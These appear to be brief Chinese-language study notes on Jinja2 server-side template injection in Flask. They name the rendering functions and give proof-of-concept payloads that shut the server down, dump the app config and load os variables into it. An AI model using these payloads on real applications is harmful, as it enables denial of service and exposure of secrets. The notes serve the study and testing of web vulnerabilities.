参考：
	- http://www.vuln.cn/6194

## Flask

渲染函数
- render_template
- render_template_string

使用的是jinja2的模板引擎

poc
下面 {\*2，因为写2个{会渲染错误出错。

`{request.environ['werkzeug.server.shutdown']()}`   #拒绝服务,gunicorn运行应用程序时不会发生
`{config.items()}`  # 配置文件
`{config.from_object('os')}` # 在config对象中添加那些在os库中变量名全是大写的属性

config对象是一个类似于字典的对象，但它也是包含若干独特方法的子类：from_envvar，from_object，from_pyfile，以及root_path
